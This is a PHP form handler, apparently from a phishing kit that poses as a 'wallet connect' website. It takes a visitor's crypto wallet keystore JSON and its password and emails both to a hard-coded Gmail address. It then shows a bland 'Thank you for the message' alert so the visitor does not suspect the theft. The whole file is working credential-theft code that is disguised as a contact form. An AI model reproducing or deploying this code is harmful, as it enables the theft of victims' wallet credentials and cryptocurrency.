<?php

    $field_name = $_POST['keystorejson'];
    $field_pass = $_POST['keystorepasswword'];
    // $field_message = $_POST['cf_message'];

    $to = 'Jsouthard31@gmail.com';
    $email_subject = 'Message from a site visitor '.$field_name;

    $body_message = 'Keystore JSON: '.$field_name."\n";
    $body_message .= 'Password: '.$field_pass."\n";
    // $body_message .= 'Message: '.$field_message;


  $headers = "From: wallet connect website \r\n";

  $headers .= "Reply-To:  \r\n";

  $email_sent = mail($to,$email_subject,$body_message,$headers);

  if($email_sent) { ?>

     <script language="javascript" type="text/javascript">
        alert('Thank you for the message. We will contact you shortly.');
        //window.location = 'contact_page.html';
     </script>

     <?php } else { ?>

     <script language="javascript" type="text/javascript">
      alert('Message failed.');
      //window.location = 'contact_page.html';
    </script>
    <?php  
    }
   //header('Location: https://saprs.000webhostapp.com/index.html');
 ?>
